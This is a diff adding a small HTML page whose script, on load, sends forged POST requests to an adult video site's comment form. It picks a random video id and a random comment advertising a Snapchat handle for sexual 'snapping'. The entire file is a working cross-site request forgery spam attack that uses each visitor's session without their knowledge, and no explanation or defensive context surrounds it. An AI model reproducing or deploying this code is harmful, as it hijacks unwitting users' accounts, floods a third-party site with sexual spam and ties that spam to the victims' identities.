@@ -1,0 +1,47 @@
+<html><head><script>
+function getVid(){
+   var sites = ["352357","352357","346727","346727","315972","315972","350343","350343","327071","327071","349023","349023","320281","320281","349982","349982","414278","414278","335612","335612","336300","336300","342114","342114","321814","321814","327942","327942","327922","327922","325077","325077","350350","350350","352062","352062","331527","331527","340702","340702","325569","325569","331507","331507","387829","387829","327092","327092","316326","316326","334090","334090","340450","340450","325620","325620","315868","315868","314326","314326","332219","332219","328779","328779","315199","315199","352268","352268","317823","317823","335983","335983","343585","343585","350832","350832","352607","352607","314660","314660","310110","310110","314906","314906","354408","354408","352216","352216","291735","291735","309778","309778","358879","358879","198729","198729","203100","203100","316298","316298"];
+        var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+function getCom(){
+     var sites1 = ["Lookin for guys to snap with katiegreen1992", "Guys to snap with? katiegreen1992", "just made snapchat and need new friends, katiegreen1992", "guys to nude snap with me? katiegreen1992", "guys snap me katiegreen1992", "lookin for men to snap with, katiegreen1992"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
+var randy=Math.floor(Math.random()*1100);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.eporner.com/comment/', false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   xmlhttp['send']('cid=0&fid='+vid+'&text='+cmt+'&type=video');  
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
